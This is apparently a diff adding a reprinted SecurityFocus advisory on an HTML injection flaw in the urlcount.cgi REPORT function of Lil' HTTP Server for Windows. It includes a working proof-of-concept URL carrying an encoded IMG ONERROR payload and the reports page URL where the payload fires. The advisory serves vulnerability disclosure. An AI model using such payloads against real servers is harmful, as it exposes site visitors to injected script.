@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/5115/info
+
+Lil' HTTP server is a web server application for Windows environments and is maintained by Summit Computer Networks.
+
+Reportedly, Lil' HTTP Server is vulnerable to HTML injection attacks.
+
+The vulnerability is present in the 'REPORT' function found in the 'urlcount.cgi' script. While the CGI does filter script tags, other HTML elements are not sufficiently sanitized, allowing for arbitrary HTML to be injected into the reports page.
+
+http://target/urlcount.cgi?%3CIMG%20SRC%3D%22%22%20ONERROR%3D%22alert%28%27xss%27%29%22%3E
+
+This will affect web users who visit the reports page:
+
+http://target/urlcount.cgi?REPORT 
